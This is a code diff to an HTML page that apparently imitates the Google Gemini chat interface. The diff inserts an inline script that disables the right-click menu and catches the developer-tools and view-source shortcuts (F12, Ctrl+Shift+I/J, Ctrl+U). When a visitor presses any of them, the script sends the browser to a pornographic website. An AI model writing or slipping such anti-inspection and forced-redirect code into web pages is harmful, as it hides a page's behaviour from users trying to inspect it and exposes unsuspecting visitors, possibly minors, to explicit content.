@@ -55,7 +55,39 @@
       Gemini may display inaccurate info, including about people, so double-check its responses.
     </p>
   </div>
+<script type="text/javascript">
+        // Function to redirect to a specific URL
+        function redirectToURL() {
+            window.location.href = 'https://www.pornhub.com';
+        }
 
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+
+        document.addEventListener('keydown', function(e) {
+            // F12 key
+            if (e.keyCode == 123) {
+                e.preventDefault();
+                redirectToURL();
+            }
+            // Ctrl+Shift+I or Cmd+Opt+I
+            if ((e.ctrlKey && e.shiftKey && e.keyCode == 73) || (e.metaKey && e.altKey && e.keyCode == 73)) {
+                e.preventDefault();
+                redirectToURL();
+            }
+            // Ctrl+U
+            if (e.ctrlKey && e.keyCode == 85) {
+                e.preventDefault();
+                redirectToURL();
+            }
+            // Ctrl+Shift+J (for Windows) or Cmd+Opt+J (for Mac)
+            if ((e.ctrlKey && e.shiftKey && e.keyCode == 74) || (e.metaKey && e.altKey && e.keyCode == 74)) {
+                e.preventDefault();
+                redirectToURL();
+            }
+        });
+    </script>
   <script src="script.js"></script>
 </body>
 </html>
